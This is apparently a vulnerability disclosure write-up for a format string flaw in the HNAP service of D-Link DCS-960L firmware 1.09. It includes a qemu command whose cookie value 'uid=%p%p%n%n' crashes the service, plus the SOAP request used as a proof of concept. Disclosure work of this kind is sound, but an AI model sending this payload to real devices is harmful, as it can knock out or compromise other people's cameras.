D-Link/DCS-960L/DCS-960L 1.09 format string vulnerability.md

# DCS-960L 1.09 format string vulnerability

## Product Info

**Supplier**: [Smart Home, SMB and Enterprise solutions | D-Link (dlink.com)](https://www.dlink.com/en)

**Router model**: DCS-960L

**Router Version**: 1.09

**Firmware**: [D-Link Technical Support (dlinktw.com.tw)](https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L)



## Vulnerability introduction

​    There is a format string vulnerability in the sub_402280 function of the HNAP service of D-Link DCS-960L with firmware version 1.09, which can cause the service to crash.


![image](https://github.com/user-attachments/assets/847fe2f6-9602-4449-8579-a537b01c005d)


We use qemu user impersonation to verify.

```shell
qemu-mips-static -g 1337 -E REQUEST_METHOD=POST,SOAP_ACTION=1,CONTENT_LENGTH=404,COOKIE=uid=%p%p%n%n,HNAP_AUTH=1  -L . ./web/cgi-bin/hnap/hnap_service < info.txt
```

info.txt

```xml
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetDCHPolicy xmlns="http://purenetworks.com/HNAP1/"></SetDCHPolicy></soap:Body></soap:Envelope>
```

Single-stepping into the program will crash.

![image](https://github.com/user-attachments/assets/61719887-0ab5-4ad3-b1ad-b95ded5c1c3d)


## POC

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetDCHPolicy xmlns="http://purenetworks.com/HNAP1/">
        </SetDCHPolicy>
    </soap:Body>
</soap:Envelope>
```





